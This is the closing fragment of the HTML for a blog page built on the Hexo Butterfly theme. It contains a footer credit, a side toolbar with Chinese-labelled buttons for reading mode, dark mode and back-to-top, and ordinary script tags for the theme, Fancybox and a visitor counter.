href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
